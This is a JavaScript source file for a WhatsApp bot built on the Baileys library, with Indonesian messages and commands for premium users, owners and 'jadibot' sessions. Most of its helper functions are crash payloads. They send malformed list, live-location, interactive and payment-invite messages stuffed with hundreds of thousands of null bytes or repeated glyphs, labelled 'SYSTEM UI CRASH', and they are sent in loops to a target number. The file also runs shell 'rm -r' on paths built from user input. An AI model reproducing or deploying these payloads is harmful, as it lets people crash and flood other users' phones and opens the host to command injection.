require('./config');
const {
    delay,
    downloadContentFromMessage,
    makeInMemoryStore,
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType
} = require('@whiskeysockets/baileys');

const {
    isUrl,
    sleep,
    getBuffer,
    getGroupAdmins,
    fetchJson
} = require('./lib/myfunc.js');

const fs = require('fs');
const axios = require('axios');
const util = require('util');
const chalk = require('chalk');
const fetch = require('node-fetch');
const ms = require('parse-ms');
const { exec, spawn, execSync } = require('child_process');

const ownerName = global.ownerName;
const botName = global.botName;
const autoTyping = global.Auto_Typing;
const autoRecording = global.Auto_Recording;
const autoRecordType = global.Auto_RecordType;
const autoReadMessage = global.Auto_ReadPesan;

global.locID = '1';
global.eggID = '15';

let premiumUsers = JSON.parse(fs.readFileSync('./db/premium.json'));
let owners = JSON.parse(fs.readFileSync('./db/owners.json'));

let muteBot = false;

module.exports = async (client, message, args) => {
  try {
    const {
    fromMe,
    isBaileys,
    isQuotedMsg,
    quotedMsg,
    mentioned,
} = message;

if (message.key && message.key.remoteJid === 'status@broadcast') {
    return;
}

const messageType = getContentType(message.message)
const messageString = JSON.stringify(message.message)
const remoteJid = message.key.remoteJid
const quotedMessage = messageType === 'extendedTextMessage' && message.message.extendedTextMessage.contextInfo != null ? message.message.extendedTextMessage.contextInfo.quotedMessage || [] : [], messageContent = messageType === 'conversation' && message.message.conversation ? message.message.conversation : messageType === 'imageMessage' && message.message.imageMessage.caption ? message.message.imageMessage.caption : messageType === 'documentMessage' && message.message.documentMessage.caption ? message.message.documentMessage.caption : messageType === 'videoMessage' && message.message.videoMessage.caption ? message.message.videoMessage.caption : messageType === 'extendedTextMessage' && message.message.extendedTextMessage.text ? message.message.extendedTextMessage.text : messageType === 'buttonsResponseMessage' && message.message.buttonsResponseMessage.selectedButtonId ? message.message.buttonsResponseMessage.selectedButtonId : messageType === 'templateButtonReplyMessage' && message.message.templateButtonReplyMessage.selectedId ? message.message.templateButtonReplyMessage.selectedId : ''
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?@#$%^&.+-,\/\\©^]/.test(messageContent) ? messageContent.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?@#$%^&.+-,\/\\©^]/gi) : '.'
const budy = (typeof message.text == 'string' ? message.text : '')
const command = messageContent
        .replace(prefix, '')
        .trim()
        .split(/ +/)
        .shift()
        .toLowerCase()
const args = messageContent.trim().split(/ +/).slice(1)
const fullCommand = args.join(' ')
const quotedText = (q = args.join(' '))
const isGroup = remoteJid.endsWith('@g.us')
const userId = client.user.id.split(':')[0]
const selfJid = userId + '@s.whatsapp.net'
const senderJid = message.key.fromMe ? client.user.id.split(':')[0] + '@s.whatsapp.net' || client.user.id : message.key.participant || message.key.remoteJid
const senderId = senderJid.split('@')[0]
const senderName = message.pushName || '' + senderId
const isSelf = userId.includes(senderId)
const isDeveloper = global.devNumber.includes(senderId)
const isPremium = [global.devNumber, ...premiumUsers].includes(senderId)
const isOwner = owners.includes(senderId)
const groupMetadata = isGroup ? await client.groupMetadata(remoteJid) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupParticipants = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupParticipants) : ''
const isBotAdmin = groupAdmins.includes(userId + '@s.whatsapp.net') || false
const isGroupAdmin = groupAdmins.includes(senderJid) || false;

const formatDuration = (duration) => {
    let seconds = Number(duration),
        days = Math.floor(seconds / 86400),
        hours = Math.floor((seconds % 86400) / 3600),
        minutes = Math.floor((seconds % 3600) / 60),
        remainingSeconds = Math.floor(seconds % 60),
        daysDisplay = days > 0 ? days + (days == 1 ? ' Hari, ' : ' Hari, ') : '',
        hoursDisplay = hours > 0 ? hours + (hours == 1 ? ' Jam, ' : ' Jam, ') : '',
        minutesDisplay = minutes > 0 ? minutes + (minutes == 1 ? ' Menit, ' : ' Menit, ') : '',
        secondsDisplay = remainingSeconds > 0 ? remainingSeconds + (remainingSeconds == 1 ? ' Detik' : ' Detik') : '';
    return daysDisplay + hoursDisplay + minutesDisplay + secondsDisplay;
};
const formatJSON = async (data) => {
    return JSON.stringify(data, null, 2);
};
const defaultMessage = {
    key: {
        fromMe: false,
        participant: '0@s.whatsapp.net',
        remoteJid: 'status@broadcast',
    },
    message: {
        extendedTextMessage: { text: '' + formatDuration(process.uptime()) },
    },
};
const sendMessage = async (text) => {
    await client.sendMessage(remoteJid, { text: text }, { quoted: message });
};
const sendMessageWithoutQuote = async (text) => {
    await client.sendMessage(remoteJid, { text: text });
};
const sendMessageWithReaction = async (reaction) => {
    client.sendMessage(remoteJid, { text: reaction }, { quoted: message });
};
const sendReact = async (emote) => {
        client.sendMessage(remoteJid, {
          react: {
            text: emote,
            key: message.key,
          },
        })
      }
const sendVideoMessage = async (url, caption) => {
    client.sendMessage(remoteJid, {
        video: { url: url },
        caption: caption,
    }, { quoted: message });
};
const sendImageMessage = async (url, caption) => {
    client.sendMessage(remoteJid, {
        image: { url: url },
        caption: caption,
    }, { quoted: message });
};
const sendMentionMessage = async (text, mentions = []) => {
    client.sendMessage(remoteJid, {
        text: text,
        mentions: mentions,
    }, { quoted: message });
};
const sendMentionMessageWithoutQuote = async (text, mentions = []) => {
    client.sendMessage(remoteJid, {
        text: text,
        mentions: mentions,
    }, { quoted: defaultMessage });
};
const sendDocumentMessage = async (url, fileName) => {
    client.sendMessage(remoteJid, {
        document: { url: url },
        fileName: fileName + '.mp3',
        mimetype: 'audio/mp3',
    }, { quoted: message });
};
const generateRandomString = async (length) => {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
          charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
};
const generateRandomNumberString = (length) => {
    let result = '';
    const characters = '1234567890',
          charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
};
    function sendMessageWithMentions(text, mentions = [], quotedMessage) {
    if (quotedMessage == null || quotedMessage == undefined || quotedMessage == false) {
        return client.sendMessage(
            remoteJid,
            {
                text: text,
                mentions: mentions,
            },
            { quoted: message }
        );
    } else {
        return client.sendMessage(
            remoteJid,
            {
                text: text,
                mentions: mentions,
            },
            { quoted: message }
        );
    }
}
function sendMessageWithMentionsAlt(text, mentions = [], quotedMessage) {
    if (quotedMessage == null || quotedMessage == undefined || quotedMessage == false) {
        return client.sendMessage(
            remoteJid,
            {
                text: text,
                mentions: mentions,
            },
            { quoted: message }
        );
    } else {
        return client.sendMessage(
            remoteJid,
            {
                text: text,
                mentions: mentions,
            },
            { quoted: message }
        );
    }
}
    async function sendLiveLocationMessage(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 'p',
                        degreesLongitude: 'p',
                        caption: '؂Ù†؃؄Ù½؂Ù†؃؄Ù½'.repeat(55000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                    },
                },
            },
        }),
        { userJid: userJid }
    );
    await client.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}
async function sendListMessage(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            listMessage: {
                title: '𝖘𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌'+'\0'.repeat(999999),
                footerText: '.',
                description: '.',
                buttonText: null,
                listType: 2,
                productListInfo: {
                    productSections: [
                        {
                            title: 'anjay',
                            products: [{ productId: '4392524570816732' }],
                        },
                    ],
                    productListHeaderImage: {
                        productId: '4392524570816732',
                        jpegThumbnail: null,
                    },
                    businessOwnerJid: '0@s.whatsapp.net',
                },
            },
            footer: 'puki',
            contextInfo: {
                expiration: 604800,
                ephemeralSettingTimestamp: '1679959486',
                entryPointConversionSource: 'global_search_new_chat',
                entryPointConversionApp: 'whatsapp',
                entryPointConversionDelaySeconds: 9,
                disappearingMode: { initiator: 'INITIATED_BY_ME' },
            },
            selectListType: 2,
            product_header_info: {
                product_header_info_id: 292928282928,
                product_header_is_rejected: true,
            },
        }),
        { userJid: userJid }
    );
    await client.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function sendViewOnceMessageWithCaption(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 'p',
                        degreesLongitude: 'p',
                        caption: 'Ã˜‚Ã™†Ã˜Æ’Ã˜„Ã™½Ã˜‚Ã™†Ã˜Æ’Ã˜„Ã™½' + 'Ãª¦¾'.repeat(50000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                    },
                },
            },
        }),
        { userJid: userJid }
    );
    await client.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function sendListMessageBug(recipientJid) {
  const messageContent = generateWAMessageFromContent(
    recipientJid,
    proto.Message.fromObject({
      listMessage: {
        title: 'SÃŒ¸YÃª™°ÃŒ¸SÃª™°ÃŒ¸TÃª™°ÃŒ¸EÃª™°ÃŒ¸MÃª™°ÃŒ¸ UÃŒ¸IÃŒ¸ CÃŒ¸RÃª™°ÃŒ¸AÃª™°ÃŒ¸SÃª™°ÃŒ¸HÃª™°ÃŒ¸' + '\0'.repeat(920000), 
        footerText: 'Ã Âº®Ã¢‚®Ã ½Å¾Ã ¸¨VÃª™°Ã ¸¨ Ã ¹–Ã Âº¡GÃª™°Ã ½€Ã¡ÃÅ“Ã¢Å“…Ã¢Æ’Å¸Ã¢•®',
        description: 'Ã Âº®Ã¢‚®Ã ½Å¾Ã ¸¨VÃª™°Ã ¸¨ Ã ¹–Ã Âº¡GÃª™°Ã ½€Ã¡ÃÅ“Ã¢Å“…Ã¢Æ’Å¸Ã¢•®',
        buttonText: null,
        listType: 2,
        productListInfo: {
          productSections: [
            {
              title: 'lol',
              products: [{ productId: '4392524570816732' }],
            },
          ],
          productListHeaderImage: {
            productId: '4392524570816732',
            jpegThumbnail: null,
          },
          businessOwnerJid: '0@s.whatsapp.net',
        },
      },
      footer: 'lol',
      contextInfo: {
        expiration: 600000,
        ephemeralSettingTimestamp: '1679959486',
        entryPointConversionSource: 'global_search_new_chat',
        entryPointConversionApp: 'whatsapp',
        entryPointConversionDelaySeconds: 9,
        disappearingMode: { initiator: 'INITIATED_BY_ME' },
      },
      selectListType: 2,
      product_header_info: {
        product_header_info_id: 292928282928,
        product_header_is_rejected: false,
      },
    }),
    { userJid: recipientJid }
  );

  await client.relayMessage(recipientJid, messageContent.message, {
    participant: { jid: recipientJid },
    messageId: messageContent.key.id,
  });
}


async function sendInteractiveListMessage(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: '',
                            subtitle: '𝕾𝖙𝖗𝖆𝖛𝖆𝕺𝖋𝖈',
                        },
                        body: {
                            text: '𝕾𝖙𝖗𝖆𝖛𝖆 𝕭𝖚𝖌',
                        },
                        footer: {
                            text: '𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕',
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson: "{ display_text : '𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌', url : , merchant_url :  }",
                                },
                                {
                                    name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : '𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌', url : , merchant_url :  }",
                    },
                    {
                      name: 'cta_url',
                      buttonParamsJson:
                        "{ display_text : '𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌', url : , merchant_url :  }",
                                },
                            ],
                            messageParamsJson: ''.repeat(999999),
                        },
                    },
                },
            },
        }),
        { userJid: userJid }
    );
    await client.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}

async function sendInteractiveMessageWithHeader(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: '',
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: 'à¾§'.repeat(250000),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            title: '',
                            subtitle: '',
                            hasMediaAttachment: false,
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson:
                          '{ display_text : " ", url : , merchant_url : " "}',
                                },
                            ],
                            messageParamsJson: '\0'.repeat(100000),
                        }),
                    }),
                },
            },
        }),
        {}
    );
    await client.relayMessage(userJid, messageContent.message, {
        messageId: messageContent.key.id,
    });
}
async function sendInteractiveMessage(recipientJid) {
  let messageContent = generateWAMessageFromContent(
    recipientJid,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            body: proto.Message.InteractiveMessage.Body.create({
              text: '',
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: 'ê¦¾'.repeat(230000),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              title: '',
              subtitle: '',
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: 'cta_url',
                    buttonParamsJson:
                      '{ display_text : " ", url : , merchant_url : " "}',
                  },
                ],
                messageParamsJson: '\0'.repeat(100000),
              }),
          }),
        },
      },
    },
    {}
  );
  await client.relayMessage(recipientJid, messageContent.message, {
    participant: { jid: recipientJid },
    messageId: messageContent.key.id,
  });
}
async function sendLiveLocationMessageBug(recipientJid) {
    var liveLocationMessage = generateWAMessageFromContent(
        recipientJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 'p',
                        degreesLongitude: 'p',
                        caption:
                  '؂Ù†؃؄Ù½؂Ù†؃؄Ù½' +
                  'ê¦¾'.repeat(50000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                    },
                },
            },
        }),
        { userJid: recipientJid }
    );
    await client.relayMessage(recipientJid, liveLocationMessage.message, {
        participant: { jid: recipientJid },
        messageId: liveLocationMessage.key.id,
    });
}
async function sendInteractiveMessageV2(recipientJid) {
    var interactiveMessage = generateWAMessageFromContent(
        recipientJid,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: '',
                            subtitle: '',
                        },
                        body: { text: '' },
                        footer: { text: '' },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson:
                        '{ display_text : " ", url : , merchant_url : " "}',
                                },
                            ],
                            messageParamsJson: '\0'.repeat(1000000),
                        },
                    },
                },
            },
        }),
        { userJid: recipientJid }
    );
    await client.relayMessage(recipientJid, interactiveMessage.message, {
        participant: { jid: recipientJid },
        messageId: interactiveMessage.key.id,
    });
}

async function sendListMessageWithProductInfo(userJid) {
    const messageContent = generateWAMessageFromContent(
        userJid,
        proto.Message.fromObject({
            listMessage: {
                title:
              '؂Ù†؃؄Ù½؂Ù†؃؄Ù½' + '\0'.repeat(920000),
                footerText: '',
                description: '',
                buttonText: null,
                listType: 2,
                productListInfo: {
                    productSections: [
                        {
                            title: 'anjay',
                            products: [{ productId: '4392524570816732' }],
                        },
                    ],
                    productListHeaderImage: {
                        productId: '4392524570816732',
                        jpegThumbnail: null,
                    },
                    businessOwnerJid: '0@s.whatsapp.net',
                },
            },
            footer: 'puki',
            contextInfo: {
                expiration: 604800,
                ephemeralSettingTimestamp: '1679959486',
                entryPointConversionSource: 'global_search_new_chat',
                entryPointConversionApp: 'whatsapp',
                entryPointConversionDelaySeconds: 9,
                disappearingMode: { initiator: 'INITIATED_BY_ME' },
            },
            selectListType: 2,
            product_header_info: {
                product_header_info_id: 292928282928,
                product_header_is_rejected: false,
            },
        }),
        { userJid: userJid }
    );
    await client.relayMessage(userJid, messageContent.message, {
        participant: { jid: userJid },
        messageId: messageContent.key.id,
    });
}
    async function sendExtendedTextMessage(recipientJid) {
    var message = generateWAMessageFromContent(
        recipientJid,
        proto.Message.fromObject({
            extendedTextMessage: {
                text: '𝟾𝟙𝟗𝟞𝟨𝟚-𝟭𝟨𝟜𝟜',
                contextInfo: {
                    stanzaId: recipientJid,
                    participant: recipientJid,
                    quotedMessage: {
                        conversation: '؂Ù†؃؄Ù½؂Ù†؃؄Ù½'.repeat(40000),
                    },
                    disappearingMode: {
                        initiator: 'CHANGED_IN_CHAT',
                        trigger: 'CHAT_SETTING',
                    },
                },
                inviteLinkGroupTypeV2: 'DEFAULT',
            },
        }),
        { userJid: recipientJid }
    );
    await client.relayMessage(recipientJid, message.message, {
        participant: { jid: recipientJid },
        messageId: message.key.id,
    });
}

async function sendShortExtendedTextMessage(recipientJid) {
    await client.relayMessage(
        recipientJid,
        {
            extendedTextMessage: {
                text: '.',
                contextInfo: {
                    stanzaId: recipientJid,
                    participant: recipientJid,
                    quotedMessage: { conversation: 'ê¦¾'.repeat(50000) },
                    disappearingMode: {
                        initiator: 'CHANGED_IN_CHAT',
                        trigger: 'CHAT_SETTING',
                    },
                },
                inviteLinkGroupTypeV2: 'DEFAULT',
            },
        },
        { participant: { jid: recipientJid } },
        { messageId: null }
    );
}

async function sendPaymentInviteUPI(recipientJid) {
    await client.relayMessage(
        recipientJid,
        {
            paymentInviteMessage: {
                serviceType: 'UPI',
                expiryTimestamp: Date.now() + 86400000, // 1 day in milliseconds
            },
        },
        { participant: { jid: recipientJid } }
    );
}

async function sendPaymentInviteLECCY(recipientJid) {
    await client.relayMessage(
        recipientJid,
        {
            paymentInviteMessage: {
                serviceType: 'LECCY',
                expiryTimestamp: Date.now() + 86400000000, // 1000 days in milliseconds
            },
        },
        { participant: { jid: recipientJid } }
    );
}

async function sendPaymentInviteFBPAY(recipientJid) {
    await client.relayMessage(
        recipientJid,
        {
            paymentInviteMessage: {
                serviceType: 'FBPAY',
                expiryTimestamp: Date.now() + 1814400000, // 21 days in milliseconds
            },
        },
        { participant: { jid: recipientJid } }
    );
}
    async function sendRepeatedMessages(recipientJid, repeatCount) {
    for (let i = 0; i < repeatCount; i++) {
        sendInteractiveMessageWithHeader(recipientJid);
        sendInteractiveMessageWithHeader(recipientJid);
        sendInteractiveMessageWithHeader(recipientJid);
    }
}
async function sendMultipleTypesOfMessages(recipientJid, repeatCount) {
    for (let i = 0; i < repeatCount; i++) {
        sendListMessage(recipientJid);
        sendLiveLocationMessage(recipientJid);
        sendInteractiveListMessage(recipientJid);
    }
}
async function sendAlternatingMessages(recipientJid, repeatCount) {
    for (let i = 0; i < repeatCount; i++) {
        sendExtendedTextMessage(recipientJid);
        sendPaymentInviteLECCY(recipientJid);
        sendExtendedTextMessage(recipientJid);
        sendPaymentInviteLECCY(recipientJid);
    }
}
    if (Auto_Typing) {
  await delay(500);
  client.sendPresenceUpdate('composing', remoteJid);
}

if (Auto_Recording) {
  await delay(500);
  client.sendPresenceUpdate('recording', remoteJid);
}

if (Auto_ReadPesan) {
  await delay(500);
  client.readMessages([messageKey]);
}

if (muteBot) {
  if (isGroup) {
    return;
  }
  if (!isGroup && !isOwner && !isSelf) {
    return;
  }
}

if (isGroup) {
  if (!isGroup && !isOwner && !isSelf && !isPremium) {
    return;
  }
  console.log(
    chalk.bgBlack(
      chalk.redBright('\n===========================================\n')
    )
  );
  console.log(chalk.black(chalk.white('Group Chat :')));
  console.log(
    chalk.black(chalk.cyan('- Message :')),
    chalk.black(chalk.greenBright(messageContent || message.mtype)) +
    '\n' +
    chalk.magenta('- From :'),
    chalk.green(senderName),
    chalk.yellow(senderId.split('@')[0]) +
    '\n' +
    chalk.blueBright('=> in'),
    chalk.green(senderName, remoteJid)
  );
} else {
  if (!isGroup && !isOwner && !isSelf && !isPremium) {
    return;
  }
  console.log(
    chalk.bgBlack(
      chalk.redBright('\n===========================================\n')
    )
  );
  console.log(chalk.black(chalk.white('Private Chat :')));
  console.log(
    chalk.bgBlack(chalk.cyan('- Message :')),
    chalk.black(chalk.greenBright(messageContent || message.mtype)) +
    '\n' +
    chalk.magenta('- From :'),
    chalk.green(senderName),
    chalk.yellow(senderId.split('@')[0]) + '\n'
  );
}
    switch (command) {
      case 'runtime':
  if (!isDeveloper) {
    return sendMessage('This feature can only be used by the owner');
  }
  sendMessage(formatUptime(process.uptime()));
  break
  
case 'mute':
  if (!isDeveloper) {
    return sendMessage('This feature can only be used by the owner');
  }
  if (muteBot === true) {
    return sendMessage('*The bot was in self mode before*');
  }
  muteBot = true;
  sendMessage('*Successfully Activated Self Mode!*');
  break

case 'unmute':
  if (!isDeveloper) {
    return sendMessage('This feature can only be used by the owner');
  }
  if (muteBot === false) {
    return sendMessage('*The bot has been in self mode before*');
  }
  muteBot = false;
  sendMessage('*Successfully Turned Off Self Mode!*');
  break

case 'stopjadibot':
  const userId = senderId.split('@')[0];
  const sessionPath = './database/jadibot/' + userId;
  if (!fs.existsSync(sessionPath)) {
    return sendMessage('*Maaf, Kamu Tidak Terdaftar Jadibot!*');
  }
  exec('rm -r ' + sessionPath);
  sendMessage('*Successfully deleted session ✓*');
  break

      case 'del-sesi':
    {
        if (!args[0]) {
            return sendMessage('EX: .d-sesi 628xxxx');
        }
        if (!isDeveloper) {
            return sendMessage('This feature can only be used by the owner');
        }
        const phoneNumber = args[0].replace(/[^0-9]/g, '');
        const sessionPath = './database/jadibot/' + phoneNumber;
        if (!fs.existsSync(sessionPath)) {
            return sendMessage('*Maaf, Nomor itu Tidak Terdaftar Jadibot!*');
        }
        exec('rm -r ' + sessionPath);
        const sessionJid = phoneNumber + '@s.whatsapp.net';
        sendMessageWithMentions('*Successfully deleted session* @' + sessionJid.split('@')[0], [
            sessionJid,
        ]);
    }
    break
case 'resetjadibot':
    if (!isDeveloper) {
        return sendMessage('This feature can only be used by the owner');
    }
    const userSessionPath = 'database/jadibot/' + senderJid.split('@')[0];
    exec('rm -r ' + userSessionPath);
    sendMessage('*Successfully restarted session ✓*');
    await sleep(3000);
    process.exit();
    break
case 'listjadibot':
    if (!isDeveloper) {
        return sendMessage('This feature can only be used by the owner');
    }
    let userCount = 1;
    const { jadibot, conns } = require('./lib/jadibot');
    try {
        const uniqueUsers = [
            ...new Set([...global.conns.filter(conn => conn.user).map(conn => conn.user)]),
        ];
        let messageText =
            '▬▭▬▭▬▭▬▭▬▭▬▭\n*LISTJADIBOT-TREE*\n*Total Users* : ' +
            uniqueUsers.length +
            '\n▬▭▬▭▬▭▬▭▬▭▬▭\n';
        for (let user of uniqueUsers) {
            const userId = await client.decodeJid(user.id);
            messageText += '*⭔UserID* : ' + ('' + userCount++) + '\n';
            messageText += '*⭔Number* : @' + userId.split('@')[0] + '\n▬▭▬▭▬▭▬▭▬▭▬▭\n';
        }
        client.sendTextWithMentions(remoteJid, messageText, message);
    } catch (err) {
        sendMessage('Belum Ada User Yang Jadibot');
    }
    break
      case 'jadibot':
    {
        if (!q) {
            return sendMessage('EX: .jadibot 628xxxx');
        }
        if (!isDeveloper) {
            return sendMessage('This feature can only be used by the owner');
        }
        
        const phoneNumber = args[0].replace(/[^0-9]/g, '');
        const userJid = userId + '@s.whatsapp.net';
        const sessionJid = phoneNumber + '@s.whatsapp.net';
        const sessionPath = './database/jadibot/' + phoneNumber;

        if (fs.existsSync(sessionPath)) {
            return sendMessageWithMentions(
                `*Mohon maaf* @${sessionJid.split('@')[0]} ^_^\n*Session users masih terdaftar.*\n\n*Silahkan ketik* .stopjadibot\n*Untuk menghapus session ✓*`,
                [sessionJid]
            );
        }

        sendMessage('*We are processing your request.*');

        const { jadibot, conns } = require('./lib/jadibot');
        let jadibotInstance = await jadibot(client, phoneNumber, sessionJid, userJid);
        await sleep(3500);

        const pairingCodeMessage = `*MASUKKAN CODE PAIRING DIBAWAH INI*\n*UNTUK MENJADI BOT SEMENTARA ✓*\n\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk perangkat tertaut\n3. Ketuk tautkan perangkat\n4. Ketuk tautkan dengan nomor telepon saja\n5. Masukkan code pairing dibawah ini\n\n*Code Pairing :* \`${global.codepairing}\`\n\n*Note:*\n_Code dapat expired kapan saja._\n_Jika code error silahkan ketik_ ⇩\n\n========[  !stopjadibot  ]========`;

        client.sendMessage(sessionJid, { text: pairingCodeMessage })
            .then(() => 
                client.sendMessage(remoteJid, {
                    text: `*Successfully sent pairing code* @${sessionJid.split('@')[0]}`,
                    mentions: [sessionJid],
                })
            )
            .then(() => 
                client.sendMessage(senderJid, { text: global.codepairing }, { quoted: message })
            );
    }
    break
      case 'listprem':
    {
        if (!isDeveloper && !isOwner && !isSelf) {
            return;
        }
        
        let premiumUsers = JSON.parse(fs.readFileSync('./db/premium.json'));
        if (premiumUsers.length === 0) {
            return sendMessage('*There are no Premium Users in the database*');
        }

        let message = '_*LIST USER PREMIUM*_\n*Total Users:* ' + premiumUsers.length + '\n\n';
        let userCount = 1;
        for (let user of premiumUsers) {
            message += 'Users: ' + userCount++ + '\nNumber: @' + user + '\n\n';
        }
        client.sendTextWithMentions(remoteJid, message, message);
    }
    break
case 'addprem':
    {
        if (!isDeveloper && !isOwner && !isSelf) {
            return;
        }
        
        if (!args[0]) {
            return sendMessage('Use ' + (prefix + command) + ' number\nExample: ' + (prefix + command) + ' 628xxxxx');
        }
        
        let phoneNumber = args[0].replace(/[^0-9]/g, '');
        let isOnWhatsApp = await client.onWhatsApp(phoneNumber + '@s.whatsapp.net');
        
        if (isOnWhatsApp.length === 0) {
            return sendMessage('_Enter a valid and registered number on WhatsApp!_');
        }
        
        if (premium.includes(phoneNumber)) {
            return sendMessage('_The number is already Premium!_');
        }
        
        premium.push(phoneNumber);
        fs.writeFileSync('./db/premium.json', JSON.stringify(premium));
        let userJid = phoneNumber + '@s.whatsapp.net';
        
        sendMessageWithMentions('*Successfully added @' + userJid.split('@')[0] + ' to the Premium Users database*', [userJid]);
        await sleep(2500);
        client.sendMessage(userJid, {
            text: '*Congratulations, you can now use premium features*',
        });
    }
    break
case 'delprem':
    {
        if (!isDeveloper && !isOwner && !isSelf) {
            return;
        }
        
        if (!args[0]) {
            return sendMessage('Use ' + (prefix + command) + ' number\nExample: ' + (prefix + command) + ' 628xxxxx');
        }
        
        let phoneNumber = args[0].replace(/[^0-9]/g, '');
        let index = premium.indexOf(phoneNumber);
        
        if (index === -1) {
            return sendMessage('_Failed to remove from the database, the number is not a Premium User!_');
        }
        
        premium.splice(index, 1);
        fs.writeFileSync('./db/premium.json', JSON.stringify(premium));
        let userJid = phoneNumber + '@s.whatsapp.net';
        
        sendMessageWithMentions('*Successfully deleted @' + userJid.split('@')[0] + ' from the Premium Users database*', [userJid]);
        await sleep(2500);
        client.sendMessage(userJid, {
            text: "*It's a shame, you can no longer access premium features because they were deleted*",
        });
    }
    break
      case 'listown':
    {
        if (!isDeveloper && !isOwner && !isSelf) {
            return;
        }
        
        let owners = JSON.parse(fs.readFileSync('./db/owners.json'));
        if (owners.length === 0) {
            return sendMessage('*There are no owners in the database*');
        }

        let message = '_*LIST OWNERS*_\n*Total Users:* ' + owners.length + '\n\n';
        let userCount = 1;
        for (let owner of owners) {
            message += 'User: ' + userCount++ + '\nNumber: @' + owner + '\n\n';
        }
        client.sendTextWithMentions(remoteJid, message, message);
    }
    break
case 'addown':
    {
        if (!isDeveloper && !isOwner) {
            return;
        }
        
        if (!args[0]) {
            return sendMessage('Use ' + (prefix + command) + ' number\nExample: ' + (prefix + command) + ' 628xxxxx');
        }
        
        let phoneNumber = args[0].replace(/[^0-9]/g, '');
        let isOnWhatsApp = await client.onWhatsApp(phoneNumber + '@s.whatsapp.net');
        
        if (isOnWhatsApp.length === 0) {
            return sendMessage('_Enter a valid and registered number on WhatsApp!_');
        }
        
        if (owners.includes(phoneNumber)) {
            return sendMessage('_The number is already an owner!_');
        }
        
        owners.push(phoneNumber);
        fs.writeFileSync('./db/owners.json', JSON.stringify(owners));
        let userJid = phoneNumber + '@s.whatsapp.net';
        
        sendMessageWithMentions('*Successfully added @' + userJid.split('@')[0] + ' to the Owners Users database*', [userJid]);
        await sleep(2500);
        client.sendMessage(userJid, {
            text: '*Congratulations, you can now use owners features*',
        });
    }
    break
case 'delown':
    {
        if (!isDeveloper && !isOwner) {
            return;
        }
        
        if (!args[0]) {
            return sendMessage('Use ' + (prefix + command) + ' number\nExample: ' + (prefix + command) + ' 628xxxxx');
        }
        
        let phoneNumber = args[0].replace(/[^0-9]/g, '');
        let index = owners.indexOf(phoneNumber);
        
        if (index === -1) {
            return sendMessage('_Failed to remove from the database, the number is not an owner!_');
        }
        
        owners.splice(index, 1);
        fs.writeFileSync('./db/owners.json', JSON.stringify(owners));
        let userJid = phoneNumber + '@s.whatsapp.net';
        
        sendMessageWithMentions('*Successfully deleted @' + userJid.split('@')[0] + ' from the Owners Users database*', [userJid]);
        await sleep(2500);
        client.sendMessage(userJid, {
            text: "*It's a shame, you can no longer access owners features because they were deleted*",
        });
    }
    break
      case '🥀':
case '🍁':
case '🐉':
case '🌷':
case '🍒':
